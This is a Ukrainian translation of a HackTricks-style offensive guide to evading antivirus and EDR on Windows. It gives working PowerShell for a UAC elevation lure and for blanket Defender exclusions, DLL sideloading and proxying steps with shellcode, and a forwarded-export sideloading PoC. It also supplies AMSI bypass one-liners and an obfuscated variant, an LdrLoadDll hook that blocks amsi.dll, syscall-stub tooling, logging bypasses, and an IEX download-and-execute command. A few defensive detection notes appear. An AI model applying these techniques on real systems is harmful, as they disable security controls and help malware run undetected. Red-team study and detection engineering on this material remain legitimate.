# Обхід Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку спочатку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинка Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент для припинення роботи Windows Defender шляхом імітації іншого AV.
- [Вимкнення Defender, якщо ви адміністратор](basic-powershell-for-pentesters/README.md)

### UAC-приманка в стилі інсталятора перед втручанням у Defender

Загальнодоступні loaders, що маскуються під game cheats, часто постачаються як непідписані Node.js/Nexe installers, які спочатку **запитують у користувача підвищення привілеїв**, а лише потім нейтралізують Defender. Процес простий:

1. Перевірити адміністративний контекст за допомогою `net session`. Команда успішно виконується лише тоді, коли викликач має права адміністратора, тому помилка означає, що loader запущено від імені стандартного користувача.
2. Негайно повторно запустити себе з дієсловом `RunAs`, щоб викликати очікуваний запит на підтвердження UAC, зберігаючи оригінальний командний рядок.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Жертви вже вважають, що встановлюють «cracked» програмне забезпечення, тому запит зазвичай приймається, надаючи malware необхідні права для зміни політики Defender.

### Загальні виключення `MpPreference` для кожної літери диска

Після підвищення привілеїв ланцюжки на кшталт GachiLoader максимізують сліпі зони Defender замість повного вимкнення служби. Спочатку loader завершує роботу GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), а потім додає **надзвичайно широкі виключення**, через які кожен профіль користувача, системний каталог і знімний диск стає недоступним для сканування:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ключові спостереження:

- Цикл проходить по кожній змонтованій файловій системі (D:\, E:\, USB-накопичувачі тощо), тому **будь-який майбутній payload, розміщений у будь-якому місці на диску, ігнорується**.
- Виключення розширення `.sys` є перспективним — атакувальники залишають за собою можливість пізніше завантажувати unsigned drivers, не змінюючи Defender повторно.
- Усі зміни вносяться до `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, що дозволяє наступним етапам підтвердити збереження виключень або розширити їх без повторного запуску UAC.

Оскільки жодна служба Defender не зупиняється, наївні перевірки стану продовжують повідомляти “antivirus active”, хоча real-time inspection фактично не перевіряє ці шляхи.

## **AV Evasion Methodology**

Наразі AV використовують різні методи перевірки того, чи є файл malicious: static detection, dynamic analysis, а в більш advanced EDR — behavioural analysis.

### **Static detection**

Static detection досягається шляхом виявлення відомих malicious strings або масивів байтів у binary чи script, а також отримання інформації безпосередньо з файлу (наприклад, опис файлу, назва компанії, digital signatures, іконка, checksum тощо). Це означає, що використання відомих public tools може швидше призвести до виявлення, оскільки їх, імовірно, вже проаналізували та позначили як malicious. Є кілька способів обійти такий тип detection:

- **Encryption**

Якщо зашифрувати binary, AV не матиме можливості виявити вашу програму, але вам знадобиться loader, який розшифрує та запустить програму в memory.

- **Obfuscation**

Іноді достатньо змінити кілька strings у binary або script, щоб він пройшов повз AV, але це може бути трудомістким завданням залежно від того, що саме ви намагаєтеся obfuscate.

- **Custom tooling**

Якщо ви розробляєте власні tools, відомих bad signatures не буде, але це потребує багато часу та зусиль.

> [!TIP]
> Хорошим способом перевірити Windows Defender static detection є [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розділяє файл на кілька сегментів, а потім доручає Defender просканувати кожен із них окремо. Таким чином можна точно визначити, які strings або bytes у вашому binary були позначені.

Настійно рекомендую переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш binary у sandbox і стежить за malicious activity (наприклад, спробами розшифрувати та прочитати паролі з browser, виконанням minidump для LSASS тощо). З цим може бути дещо складніше працювати, але ось кілька речей, які можна зробити для обходу sandbox.

- **Sleep before execution** Залежно від реалізації, це може бути чудовим способом обійти AV dynamic analysis. AV має дуже мало часу на сканування файлів, щоб не переривати workflow користувача, тому тривалі sleep можуть завадити аналізу binary. Проблема в тому, що багато AV sandbox можуть просто пропустити sleep залежно від способу його реалізації.
- **Checking machine's resources** Зазвичай Sandboxes мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони могли б уповільнювати машину користувача. Тут також можна проявити креативність, наприклад перевірити температуру CPU або навіть швидкість обертання вентиляторів — у sandbox не все буде реалізовано.
- **Machine-specific checks** Якщо ви хочете націлитися на користувача, робоча станція якого приєднана до домену "contoso.local", можна перевірити domain комп’ютера й порівняти його із заданим. Якщо він не збігається, можна завершити роботу програми.

Виявилося, що computername Microsoft Defender's Sandbox — HAL9TH, тому перед detonation можна перевірити ім’я комп’ютера у своєму malware. Якщо ім’я збігається з HAL9TH, це означає, що ви перебуваєте всередині defender's sandbox, тож можна завершити роботу програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ось ще кілька дуже хороших порад від [@mgeeky](https://twitter.com/mariuszbit) щодо обходу Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Як ми вже зазначали в цій статті, **public tools** зрештою **будуть виявлені**, тож вам слід поставити собі запитання:

Наприклад, якщо ви хочете виконати dump LSASS, **чи справді вам потрібно використовувати mimikatz**? Чи можна скористатися іншим, менш відомим проєктом, який також виконує dump LSASS?

Правильною відповіддю, імовірно, буде другий варіант. Якщо взяти mimikatz як приклад, це, мабуть, один із найбільш, якщо не найбільш, flagged malware для AV та EDR. Сам проєкт надзвичайно крутий, але працювати з ним для обходу AV — справжній nightmare, тож просто шукайте alternatives для досягнення своєї мети.

> [!TIP]
> Під час modifying ваших payloads для evasion обов’язково **вимкніть automatic sample submission** у Defender і, будь ласка, серйозно: **НЕ UPLOAD ДО VIRUSTOTAL**, якщо ваша мета — забезпечити evasion у довгостроковій перспективі. Якщо ви хочете перевірити, чи виявляє ваш payload певний AV, встановіть його на VM, спробуйте вимкнути automatic sample submission і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли це можливо, завжди **надавайте пріоритет використанню DLL для evasion**. З мого досвіду, DLL files зазвичай **виявляються та аналізуються значно рідше**, тому в деяких випадках це дуже простий трюк для уникнення detection (якщо ваш payload, звичайно, може запускатися як DLL).

Як видно на цьому зображенні, DLL Payload від Havoc має detection rate 4/26 на antiscan.me, тоді як EXE payload має detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>порівняння antiscan.me звичайного Havoc EXE payload зі звичайним Havoc DLL</p></figcaption></figure>

Тепер ми покажемо кілька tricks, які можна використовувати з DLL files, щоб зробити їх набагато stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розміщуючи victim application і malicious payload(s) поруч один з одним.

Перевірити програми, susceptible до DLL Sideloading, можна за допомогою [Siofra](https://github.com/Cybereason/siofra) та наведеного нижче powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, уразливих до DLL hijacking, у `"C:\Program Files\\"`, а також DLL-файлів, які вони намагаються завантажити.

Я наполегливо рекомендую **самостійно досліджувати програми, придатні для DLL Hijacking/Sideloading**. За належного виконання ця техніка є досить прихованою, але якщо використовувати загальновідомі програми, придатні для DLL Sideloading, вас можуть легко виявити.

Саме розміщення шкідливої DLL із назвою, яку очікує завантажити програма, не призведе до запуску вашого payload, оскільки програма очікує наявності певних функцій усередині цієї DLL. Щоб вирішити цю проблему, ми використаємо іншу техніку, яка називається **DLL Proxying/Forwarding**.

**DLL Proxying** перенаправляє виклики, які програма здійснює з проксі (і шкідливої) DLL до оригінальної DLL, зберігаючи функціональність програми та забезпечуючи можливість виконання вашого payload.

Я використовуватиму проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, яких я дотримувався:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда надасть нам 2 файли: шаблон вихідного коду DLL і оригінальну DLL із новою назвою.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ось результати:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

І наш shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)), і proxy DLL мають рівень виявлення 0/26 в [antiscan.me](https://antiscan.me)! Вважаю, що це успіх.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **настійно рекомендую** переглянути [VOD трансляції S3cur3Th1sSh1t на Twitch](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [відео ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб дізнатися більше про детально розглянуті нами матеріали.

### Abusing Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які насправді є "forwarders": замість вказівника на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли caller вирішує адресу експорту, Windows loader:

- Завантажує `TargetDll`, якщо його ще не завантажено
- Вирішує адресу `TargetFunc` у ньому

Основні особливості, які потрібно розуміти:
- Якщо `TargetDll` є KnownDLL, він надається із захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує forward resolution.

Це дає змогу використовувати непрямий sideloading primitive: знайти підписану DLL, яка експортує функцію, перенаправлену до модуля з іменем, що не належить до KnownDLL, а потім розмістити цю підписану DLL в одній директорії з DLL під контролем attacker, названою точно так само, як цільовий модуль, указаний у forward. Коли викликається forwarded export, loader виконує forward і завантажує вашу DLL з тієї самої директорії, запускаючи її DllMain.

Приклад, виявлений у Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому його пошук виконується у звичайному порядку пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL до папки, доступної для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Розмістіть шкідливий `NCRYPTPROV.dll` у тій самій папці. Для виконання коду достатньо мінімальної DllMain; реалізовувати функцію, що переспрямовується, для запуску DllMain не потрібно.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Запустіть пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Спостережувана поведінка:
- rundll32 (signed) завантажує side-by-side `keyiso.dll` (signed)
- Під час розв’язання `KeyIsoSetAuditingInterface` завантажувач переходить за forward до `NCRYPTPROV.SetAuditingInterface`
- Потім завантажувач завантажує `NCRYPTPROV.dll` із `C:\test` і виконує його `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, помилка "missing API" виникне лише після того, як `DllMain` уже буде виконано

Поради для пошуку:
- Зосередьтеся на forwarded exports, у яких цільовий модуль не є KnownDLL. KnownDLLs перелічені в `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перелічити forwarded exports за допомогою таких інструментів:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте інвентар forwarder для Windows 11, щоб знайти потенційні цілі: https://hexacorn.com/d/apis_fwd.txt

Ідеї для виявлення/захисту:
- Відстежуйте LOLBins (наприклад, rundll32.exe), які завантажують підписані DLL із нестандартних системних шляхів, а потім завантажують non-KnownDLLs із таким самим базовим іменем із цього каталогу
- Створюйте сповіщення для ланцюжків процесів/модулів на кшталт: `rundll32.exe` → нестандартний системний `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовуйте політики цілісності коду (WDAC/AppLocker) і забороняйте write+execute у каталогах застосунків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze для прихованого завантаження та виконання вашого shellcode.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion — це просто гра в кішки-мишки: те, що працює сьогодні, завтра може бути виявлено, тому ніколи не покладайтеся лише на один інструмент і, якщо можливо, намагайтеся поєднувати кілька технік ухилення.

## Direct/Indirect Syscalls і SSN Resolution (SysWhispers4)

EDR часто встановлюють **user-mode inline hooks** на syscall stubs у `ntdll.dll`. Щоб обійти ці hooks, можна генерувати **direct** або **indirect syscall stubs**, які завантажують правильний **SSN** (System Service Number) і переходять у kernel mode, не виконуючи hooked export entrypoint.

**Варіанти виклику:**
- **Direct (embedded)**: вставляє інструкцію `syscall`/`sysenter`/`SVC #0` у згенерований stub (без звернення до export `ntdll`).
- **Indirect**: переходить до наявного `syscall` gadget усередині `ntdll`, завдяки чому перехід до kernel mode виглядає так, ніби він походить із `ntdll` (корисно для обходу евристичного виявлення); **randomized indirect** обирає gadget із пулу для кожного виклику.
- **Egg-hunt**: уникає вбудовування статичної послідовності opcode `0F 05` на диску та знаходить syscall sequence під час виконання.

**Hook-resistant стратегії SSN resolution:**
- **FreshyCalls (VA sort)**: визначає SSN, сортуючи syscall stubs за virtual address замість читання байтів stub.
- **SyscallsFromDisk**: відображає чистий `\KnownDlls\ntdll.dll`, зчитує SSN із його `.text`, а потім видаляє mapping (обходить усі in-memory hooks).
- **RecycledGate**: поєднує визначення SSN через VA sorting із перевіркою opcode, коли stub чистий; якщо він hooked, використовується визначення через VA.
- **HW Breakpoint**: встановлює DR0 на інструкцію `syscall` і використовує VEH для отримання SSN з `EAX` під час виконання, не аналізуючи hooked bytes.

Приклад використання SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AV були здатні сканувати лише **файли на диску**, тому, якби вам вдалося виконати payload **безпосередньо в пам'яті**, AV не зміг би нічого зробити для його блокування, оскільки не мав достатньої видимості.

Функцію AMSI інтегровано в такі компоненти Windows.

- User Account Control, або UAC (підвищення привілеїв для встановлення EXE, COM, MSI або ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe і cscript.exe)
- JavaScript і VBScript
- макроси Office VBA

Це дає змогу antivirus-рішенням перевіряти поведінку скриптів, відкриваючи їхній вміст у формі без шифрування та обфускації.

Виконання `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як він додає префікс `amsi:`, а потім шлях до executable, з якого було запущено скрипт, у цьому випадку powershell.exe

Ми не записували жодного файлу на диск, але все одно були виявлені в пам'яті через AMSI.

Крім того, починаючи з **.NET 4.8**, C#-код також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])` для завантаження виконання в пам'ять. Саме тому для виконання в пам'яті рекомендується використовувати нижчі версії .NET (наприклад, 4.7.2 або нижче), якщо ви хочете обійти AMSI.

Є кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI переважно працює зі статичними виявленнями, модифікація скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI здатна деобфускувати скрипти, навіть якщо вони мають кілька шарів, тому obfuscation може бути невдалим варіантом — залежно від способу її виконання. Через це обхід не є таким простим. Водночас іноді достатньо змінити кілька імен змінних — і все працюватиме, тому це залежить від того, наскільки щось було позначено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), нею можна легко маніпулювати навіть від імені непривілейованого користувача. Через цю ваду в реалізації AMSI дослідники знайшли численні способи обійти сканування AMSI.

**Forcing an Error**

Примусове завершення ініціалізації AMSI з помилкою (amsiInitFailed) призведе до того, що для поточного процесу сканування не буде ініційовано. Спочатку про це повідомив [Matt Graeber](https://twitter.com/mattifestation), після чого Microsoft розробила сигнатуру для запобігання ширшому використанню цього способу.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Усього один рядок коду powershell був потрібен, щоб зробити AMSI непридатним для використання в поточному процесі powershell. Звичайно, цей рядок сам AMSI позначив як підозрілий, тому для використання цієї техніки потрібна певна модифікація.

Ось модифікований AMSI bypass, який я взяв із цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Майте на увазі, що цей матеріал, імовірно, буде позначено після публікації, тому не слід публікувати жоден code, якщо ваш план полягає в тому, щоб залишатися непоміченим.

**Memory Patching**

Цю техніку спочатку виявив [@RastaMouse](https://twitter.com/_RastaMouse/). Вона передбачає пошук адреси функції "AmsiScanBuffer" у amsi.dll (відповідає за сканування введених користувачем даних) і перезапис її інструкціями для повернення коду E_INVALIDARG. У результаті фактичне сканування повертає 0, що інтерпретується як безпечний результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Існує також багато інших технік для обходу AMSI за допомогою powershell. Перегляньте [**цю сторінку**](basic-powershell-for-pentesters/index.html#amsi-bypass) і [**цей repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися більше.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI ініціалізується лише після завантаження `amsi.dll` у поточний процес. Надійний, language-agnostic bypass полягає у встановленні user-mode hook на `ntdll!LdrLoadDll`, який повертає помилку, коли запитуваним модулем є `amsi.dll`. У результаті AMSI ніколи не завантажується, і для цього процесу сканування не виконуються.

Загальна схема реалізації (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Примітки
- Працює в PowerShell, WScript/CScript і власних loader однаково (з усім, що в іншому випадку завантажувало б AMSI).
- Поєднуйте з передаванням скриптів через stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), щоб уникнути довгих артефактів командного рядка.
- Було помічено використання loader, запущених через LOLBins (наприклад, `regsvr32`, який викликає `DllRegisterServer`).

Інструмент **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** також генерує скрипт для обходу AMSI.
Інструмент **[https://amsibypass.com/](https://amsibypass.com/)** також генерує скрипт для обходу AMSI, який уникає сигнатур завдяки рандомізованим визначеним користувачем функціям, змінним і виразам із символів, а також застосовує випадковий регістр до ключових слів PowerShell, щоб уникнути сигнатур.

**Видалення виявленої сигнатури**

Ви можете використовувати такий інструмент, як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** і **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлену сигнатуру AMSI з пам’яті поточного процесу. Цей інструмент сканує пам’ять поточного процесу на наявність сигнатури AMSI, а потім перезаписує її інструкціями NOP, фактично видаляючи її з пам’яті.

**Продукти AV/EDR, які використовують AMSI**

Список продуктів AV/EDR, які використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте Powershell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тож ви зможете запускати свої скрипти без сканування AMSI. Це можна зробити так:
```bash
powershell.exe -version 2
```
## PS Logging

Логування PowerShell — це функція, яка дає змогу записувати всі команди PowerShell, виконані в системі. Це може бути корисно для аудиту та усунення несправностей, але також може бути **проблемою для атакерів, які хочуть уникнути виявлення**.

Щоб обійти логування PowerShell, можна використовувати такі техніки:

- **Disable PowerShell Transcription and Module Logging**: для цього можна використати такий інструмент, як [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: якщо використовувати PowerShell version 2, AMSI не буде завантажено, тому можна запускати скрипти без сканування AMSI. Це можна зробити так: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: використовуйте [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), щоб запустити powershell без захисту (саме це використовує `powerpick` із Cobal Strike).


## Обфускація

> [!TIP]
> Деякі техніки обфускації покладаються на шифрування даних, що збільшить ентропію бінарного файлу й полегшить його виявлення засобами AV та EDR. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до певних секцій коду, які містять конфіденційні дані або мають бути приховані.

### Деобфускація .NET-бінарних файлів, захищених ConfuserEx

Під час аналізу malware, що використовує ConfuserEx 2 (або комерційні форки), часто доводиться мати справу з кількома шарами захисту, які блокують декомпілятори та sandbox. Наведений нижче workflow надійно **відновлює майже оригінальний IL**, який згодом можна декомпілювати в C# за допомогою таких інструментів, як dnSpy або ILSpy.

1.  Видалення anti-tampering – ConfuserEx шифрує кожне *method body* і розшифровує його всередині статичного конструктора (`<Module>.cctor`) *module*. Це також змінює PE checksum, тому будь-яка модифікація призведе до аварійного завершення бінарного файлу. Використайте **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR keys і перезаписати очищену assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Результат містить 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисними під час створення власного unpacker.

2.  Відновлення символів / control-flow – передайте *clean* file до **de4dot-cex** (fork de4dot із підтримкою ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Прапорці:
• `-p crx` – вибір профілю ConfuserEx 2
• de4dot скасує control-flow flattening, відновить оригінальні namespaces, класи та назви змінних і розшифрує constant strings.

3.  Видалення proxy calls – ConfuserEx замінює прямі виклики методів легкими обгортками (так званими *proxy calls*), щоб додатково ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку замість непрозорих wrapper functions (`Class8.smethod_10`, …) мають відображатися звичайні .NET API, такі як `Convert.FromBase64String` або `AES.Create()`.

4.  Ручне очищення – запустіть отриманий binary у dnSpy, пошукайте великі Base64 blobs або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *real* payload. Часто malware зберігає його як TLV-encoded byte array, ініціалізований усередині `<Module>.byte_0`.

Наведений вище ланцюжок відновлює execution flow **без необхідності запускати шкідливий sample** – це корисно під час роботи на offline workstation.

> 🛈  ConfuserEx створює custom attribute з назвою `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного triage samples.

#### Однорядкова команда
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати open-source fork компіляційного набору [LLVM](http://www.llvm.org/), здатний забезпечити підвищену безпеку програмного забезпечення завдяки [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) і захисту від підробки.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації obfuscated code під час компіляції без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає рівень obfuscated operations, згенерованих фреймворком C++ template metaprogramming, що трохи ускладнить життя людині, яка хоче зламати застосунок.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це x64 binary obfuscator, здатний обфускувати різні pe-файли, зокрема: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — це простий metamorphic code engine для довільних executable-файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це fine-grained code obfuscation framework для мов, що підтримуються LLVM, який використовує ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly code, перетворюючи звичайні інструкції на ROP chains і руйнуючи наше природне уявлення про нормальний control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний перетворювати наявні EXE/DLL на shellcode, а потім завантажувати їх

## SmartScreen & MoTW

Можливо, ви вже бачили цей екран під час завантаження деяких executable-файлів з інтернету та їх виконання.

Microsoft Defender SmartScreen — це механізм безпеки, призначений для захисту кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно працює на основі репутації: рідко завантажувані застосунки активують SmartScreen, який попереджає кінцевого користувача та не дозволяє виконати файл (хоча файл усе ще можна виконати, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) з назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету разом із URL-адресою, з якої його було завантажено.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що executable-файли, підписані **trusted** signing certificate, **не активують SmartScreen**.

Дуже ефективний спосіб запобігти отриманню вашими payload Mark of The Web — упакувати їх у контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **не може** застосовуватися до томів, відмінних від **NTFS**.

